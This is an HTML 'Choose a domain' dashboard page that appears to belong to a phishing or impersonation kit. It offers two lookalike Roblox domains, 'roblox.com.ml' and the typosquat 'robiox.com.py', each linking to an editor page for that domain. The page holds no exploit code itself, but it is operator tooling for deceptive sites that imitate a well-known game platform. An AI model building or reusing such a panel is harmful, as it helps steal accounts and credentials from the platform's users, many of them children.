<!doctype html>
<html lang="en" class="dark bg-[#070707]">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Settings | Dashboard</title>
    <meta name="description" content="Choose a domain" />
    <link rel="icon" href="/public/icon.svg" type="image/svg+xml" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Geist+Mono:wght@400;500&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        darkMode: "class",
        theme: {
          extend: {
            fontFamily: {
              sans: ['Geist', 'ui-sans-serif', 'system-ui', 'sans-serif'],
              mono: ['Geist Mono', 'ui-monospace', 'monospace'],
            },
          },
        },
      }
    </script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script defer src="assets/main.js"></script>
  </head>
  <body class="bg-[#070707] font-sans antialiased text-neutral-200">
    <div id="page" data-breadcrumb="Settings">
      <div class="mx-auto max-w-3xl pt-8 sm:pt-16">
        <div class="text-center">
          <p class="text-xs font-medium tracking-[0.2em] text-neutral-500">GET STARTED</p>
          <h1 class="mt-2 text-balance text-3xl font-bold text-neutral-50 sm:text-4xl">Choose a domain</h1>
        </div>

        <div class="mt-10 grid grid-cols-1 gap-4 sm:grid-cols-2">
          <!-- Domain card 1 -->
          <div class="group flex flex-col rounded-2xl border border-white/[0.07] bg-white/[0.02] p-5 transition-colors hover:border-white/[0.12] hover:bg-white/[0.04]">
            <div class="flex size-10 items-center justify-center rounded-xl border border-white/[0.07] bg-white/[0.04] text-neutral-300">
              <i data-lucide="globe" class="size-5"></i>
            </div>
            <h2 class="mt-5 text-lg font-semibold text-neutral-50">roblox.com.ml</h2>
            <div class="mt-2 flex items-center gap-2">
              <div class="flex items-center gap-0.5">
                <i data-lucide="star" class="size-3.5 fill-red-500 text-red-500"></i>
                <i data-lucide="star" class="size-3.5 fill-red-500 text-red-500"></i>
                <i data-lucide="star" class="size-3.5 fill-red-500 text-red-500"></i>
                <i data-lucide="star" class="size-3.5 fill-red-500 text-red-500"></i>
                <i data-lucide="star" class="size-3.5 fill-red-500 text-red-500"></i>
              </div>
              <span class="text-xs text-neutral-500">67</span>
            </div>
            <div class="mt-5 border-t border-white/[0.06] pt-4">
              <a href="editor.html?domain=roblox.com.ml" class="flex w-full items-center justify-between text-sm text-neutral-300 transition-colors hover:text-neutral-50">
                <span>Select domain</span>
                <i data-lucide="arrow-up-right" class="size-4 text-neutral-500 transition-colors group-hover:text-neutral-300"></i>
              </a>
            </div>
          </div>
          <!-- Domain card 2 -->
          <div class="group flex flex-col rounded-2xl border border-white/[0.07] bg-white/[0.02] p-5 transition-colors hover:border-white/[0.12] hover:bg-white/[0.04]">
            <div class="flex size-10 items-center justify-center rounded-xl border border-white/[0.07] bg-white/[0.04] text-neutral-300">
              <i data-lucide="globe" class="size-5"></i>
            </div>
            <h2 class="mt-5 text-lg font-semibold text-neutral-50">robiox.com.py</h2>
            <div class="mt-2 flex items-center gap-2">
              <div class="flex items-center gap-0.5">
                <i data-lucide="star" class="size-3.5 fill-red-500 text-red-500"></i>
                <i data-lucide="star" class="size-3.5 fill-red-500 text-red-500"></i>
                <i data-lucide="star" class="size-3.5 fill-red-500 text-red-500"></i>
                <i data-lucide="star" class="size-3.5 fill-red-500 text-red-500"></i>
                <i data-lucide="star" class="size-3.5 fill-red-500 text-red-500"></i>
              </div>
              <span class="text-xs text-neutral-500">5.0</span>
            </div>
            <div class="mt-5 border-t border-white/[0.06] pt-4">
              <a href="editor.html?domain=robiox.com.py" class="flex w-full items-center justify-between text-sm text-neutral-300 transition-colors hover:text-neutral-50">
                <span>Select domain</span>
                <i data-lucide="arrow-up-right" class="size-4 text-neutral-500 transition-colors group-hover:text-neutral-300"></i>
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
